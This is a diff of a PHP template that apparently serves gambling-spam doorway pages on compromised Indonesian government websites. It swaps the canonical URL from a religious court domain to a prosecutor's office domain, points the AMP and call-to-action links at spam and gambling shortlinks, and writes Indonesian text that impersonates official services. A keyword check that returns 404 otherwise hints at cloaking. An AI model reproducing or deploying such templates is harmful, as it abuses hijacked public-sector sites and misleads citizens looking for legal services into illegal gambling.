@@ -43,15 +43,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://rutangalo.fun/id/?google=$dashbrand";
-$canonical = "https://pa-paniai.go.id/-/$dashbrand";
-$cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dt3xlwq3j/image/upload/v1728309671/OIG2.ePglkWmP4DOrIX1lJTWh_xbtpfx.jpg";
+$amphtml = "https://galalasho.top/id/?google=$dashbrand";
+$canonical = "https://kejari-lampungtimur.kejaksaan.go.id/vendor/$dashbrand";
+$cta = "https://t.ly/betboss";
+$gambar = "https://res.cloudinary.com/dt3xlwq3j/image/upload/v1728309672/OIG2.SHddNCMkSiEHHR_xDuFH_no0lyu.jpg";
 $price = "5000.00";
 
-$judul = "Platform $namabrand Pengadilan Agama Paniai Kelas";
-$desc = "$namabrand menjadi salah satu lembaga pengadilan agama di wilayah Paniai kelas 2 yang memberikan layanan dan wadah untuk masayarakat apabila memiliki keluhan atau bahkan adanya masalah dilingkungan sosial mereka saat ini melalui link alternatif.";
-$konten = "$namabrand menjadi salah satu lembaga pengadilan agama di wilayah Paniai kelas 2 yang memberikan layanan dan wadah untuk masayarakat apabila memiliki keluhan atau bahkan adanya masalah dilingkungan sosial mereka saat ini melalui link alternatif.";
+$judul = "Layanan Pemenuhan Undangan Rapat $namabrand";
+$desc = "Lembaga yang menangani segala kasus merupakan kejaksaan dengan adanya platform layanan permohonan untuk masyarakat yang ingin mendapatkan haknya bisa langsung datang ke kantor atau online di $namabrand untuk mendapatkan undangan agar bisa masuk dan mengantri dengan tujuan memiliki hak dan keamanan yang sama.";
+$konten = "Lembaga yang menangani segala kasus merupakan kejaksaan dengan adanya platform layanan permohonan untuk masyarakat yang ingin mendapatkan haknya bisa langsung datang ke kantor atau online di $namabrand untuk mendapatkan undangan agar bisa masuk dan mengantri dengan tujuan memiliki hak dan keamanan yang sama.";
 ?>
 
 
